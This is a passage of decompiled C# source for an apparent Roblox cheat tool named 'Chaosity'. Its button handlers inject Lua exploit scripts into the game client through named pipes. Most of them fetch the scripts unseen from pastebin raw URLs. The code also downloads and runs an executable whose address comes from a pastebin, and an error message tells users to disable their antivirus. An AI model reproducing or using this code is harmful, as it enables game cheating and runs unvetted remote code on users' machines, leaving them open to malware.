      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void button1_Click(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.DarkRed;
      this.formSkin1.Refresh();
    }

    private void flatButton262_Click_3(object sender, EventArgs e)
    {
      this.formSkin1.FlatColor = System.Drawing.Color.DarkRed;
      this.formSkin1.Refresh();
    }

    private void flatButton655_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/uepfVV8b"));
      Thread.Sleep(100);
    }

    private void flatButton654_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/aK9n6GEj"));
      Thread.Sleep(100);
    }

    private void flatButton657_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/hFs9Yc2T"));
      Thread.Sleep(100);
    }

    private void flatButton656_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton658_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton659_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton661_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RsgmAbaK"));
      Thread.Sleep(100);
    }

    private void flatButton262_Click_4(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton662_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton663_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/VpNuaU3p"));
      Thread.Sleep(100);
    }

    private void flatButton665_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6tmdDFVi"));
      Thread.Sleep(100);
    }

    private void flatButton664_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton667_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/CfZ1Ndcc"));
      Thread.Sleep(100);
    }

    private void flatButton666_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton669_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/49anMBQ5"));
      Thread.Sleep(100);
    }

    private void flatButton668_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ER9AuKfi"));
      Thread.Sleep(100);
    }

    private void flatButton671_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/k7qcerx4"));
      Thread.Sleep(100);
    }

    private void flatButton670_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton673_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JfExXf6r"));
      Thread.Sleep(100);
    }

    private void flatButton675_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kViiiUkS"));
      Thread.Sleep(100);
    }

    private void flatButton674_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton677_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/gBNiuiPk"));
      Thread.Sleep(100);
    }

    private void flatButton679_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Qzsi9Gst"));
      Thread.Sleep(100);
    }

    private void flatButton678_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton681_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/TDqmiqkM"));
      Thread.Sleep(100);
    }

    private void flatButton680_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton683_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/J9w0q8qM"));
      Thread.Sleep(100);
    }

    private void flatButton682_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton685_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/PbXxukj0"));
      Thread.Sleep(100);
    }

    private void flatButton684_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton687_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wqed58An"));
      Thread.Sleep(100);
    }

    private void flatButton686_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton689_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/SyCyu4RY"));
      Thread.Sleep(100);
    }

    private void tabPage3_Click(object sender, EventArgs e)
    {
    }

    private void button1_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString());
    }

    private void button2_Click(object sender, EventArgs e)
    {
      if (this.open.ShowDialog() != DialogResult.OK)
        return;
      this.webBrowser1.Document.InvokeScript("SetText", (object[]) new string[1]
      {
        System.IO.File.ReadAllText(this.open.FileName)
      });
    }

    private void button3_Click(object sender, EventArgs e)
    {
      this.webBrowser1.Document.InvokeScript("SetText", new object[1]
      {
        (object) ""
      });
    }

    private void button4_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Filter = "Lua File (*.lua)|*.lua|Text File (*.txt)|*.txt";
      saveFileDialog.Title = "Save Script";
      if (saveFileDialog.ShowDialog() != DialogResult.OK)
        return;
      try
      {
        string str = this.webBrowser1.Document.InvokeScript("GetText", (object[]) new string[0]).ToString();
        StreamWriter streamWriter = new StreamWriter((Stream) System.IO.File.Create(saveFileDialog.FileName));
        streamWriter.Write(str);
        streamWriter.Dispose();
      }
      catch
      {
        int num = (int) MessageBox.Show("An unexpected error occured!", "Oof");
      }
    }

    private void button201_Click(object sender, EventArgs e)
    {
      foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
        process.Kill();
    }

    private void button202_Click(object sender, EventArgs e)
    {
      if (DialogResult.Yes != MessageBox.Show("Are you sure you want to reinstall ROBLOX?", "Chaosity", MessageBoxButtons.YesNo, MessageBoxIcon.Question))
        return;
      int num1 = (int) MessageBox.Show("Roblox is now reinstalling!\nThis could take a while, please wait patiently.", "Chaosity", MessageBoxButtons.OK);
      try
      {
        foreach (Process process in Process.GetProcessesByName("RobloxPlayerBeta"))
          process.Kill();
      }
      catch (Exception ex)
      {
        int num2 = (int) MessageBox.Show(Convert.ToString((object) ex), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
      }
      catch
      {
      }
      try
      {
        Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData));
        if (Directory.Exists("Roblox"))
          Directory.Delete("Roblox", true);
        if (System.IO.File.Exists("Installer.exe"))
          System.IO.File.Delete("Installer.exe");
      }
      catch
      {
      }
      new WebClient().DownloadFile("http://setup.roblox.com/RobloxPlayerLauncher.exe", "Installer.exe");
      Process.Start("Installer.exe");
    }

    private void button33_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void button18_Click(object sender, EventArgs e)
    {
      try
      {
        if (this.cb2.Checked)
        {
          NamedPipes.EasyExploitsInject();
          NamedPipes.wrd = false;
          NamedPipes.easy = true;
          NamedPipes.nem = false;
        }
        else
        {
          int num = (int) MessageBox.Show("Please select a API & Inject first.", "API Selection // Injection");
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show("Your Antivirus Is Blocking The DLL From Downloading. Please Disable Your Antivirus Then Reload Chaosity.If This Error Continues Please Message Chaosity On Discord @Chaosity#0001");
        Environment.Exit(0);
      }
    }

    private void MultipleROBLOX_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.MultipleROBLOX.Checked)
        return;
      Mutex mutex = new Mutex(true, "ROBLOX_singletonMutex");
      int num = (int) MessageBox.Show("Multiple Roblox activated successfully, join on another account to enable another session.", "Multiple Roblox");
    }

    private void cb2_CheckedChanged(object sender, EventArgs e)
    {
      if (this.cb2.Checked)
        NamedPipes.easy = true;
      else
        NamedPipes.easy = false;
    }

    private void cb1_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void tabPage169_Click(object sender, EventArgs e)
    {
    }

    private void pictureBox32_MouseDown(object sender, MouseEventArgs e)
    {
      this.lastPoint = new Point(e.X, e.Y);
    }

    private void pictureBox32_MouseMove(object sender, MouseEventArgs e)
    {
      if (e.Button != MouseButtons.Left)
        return;
      this.Left += e.X - this.lastPoint.X;
      this.Top += e.Y - this.lastPoint.Y;
    }

    private void button7_Click(object sender, EventArgs e)
    {
      Chaosity chaosity = new Chaosity();
      this.Hide();
      chaosity.Show();
    }

    private void button8_Click(object sender, EventArgs e)
    {
      this.WindowState = FormWindowState.Minimized;
    }

    private void button6_Click(object sender, EventArgs e)
    {
      Chaosity chaosity = new Chaosity();
      this.Hide();
      chaosity.Show();
    }

    private void button5_Click(object sender, EventArgs e)
    {
      this.flatTabControl1.SelectedTab = this.tabPage169;
    }

    private void cb3_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void button9_Click(object sender, EventArgs e)
    {
      int num = (int) MessageBox.Show("Make sure to restart your PC after installing VC Redist x86 // Opening VC Redist x86", "Injection Fix");
      WebClient webClient = new WebClient();
      string address = webClient.DownloadString("https://pastebin.com/raw/3em4nuV8");
      webClient.DownloadFile(address, Application.StartupPath + "/VC_redist.x86.exe");
      Process.Start(Directory.GetCurrentDirectory() + "/VC_redist.x86.exe");
      string path = "C:\\Chaosity";
      if (!Directory.Exists(path))
        return;
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      foreach (DirectoryInfo directory in directoryInfo.GetDirectories())
        directory.Delete(true);
      foreach (FileSystemInfo file in directoryInfo.GetFiles())
        file.Delete();
      Directory.Delete(path);
    }

    private void DGameHubMain_Load(object sender, EventArgs e)
    {
      this.module.SetIdentity("chaos");
      if (!this.universalBypassInstalled())
        return;
      int num = (int) MessageBox.Show("You must uninstall Universal Bypass before you can use Chaosity", "Universal Bypass Failed");
      Environment.Exit(0);
    }

    private void DGameHubMain_Leave(object sender, EventArgs e)
    {
      this.api.SetIdentity("");
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
            this.SuspendLayout();
            // 
            // DGameHubMain
            // 
            this.ClientSize = new System.Drawing.Size(284, 261);
            this.Name = "DGameHubMain";
            this.Load += new System.EventHandler(this.DGameHubMain_Load_1);
            this.ResumeLayout(false);

    }

        private void DGameHubMain_Load_1(object sender, EventArgs e)
        {

        }
    }
}
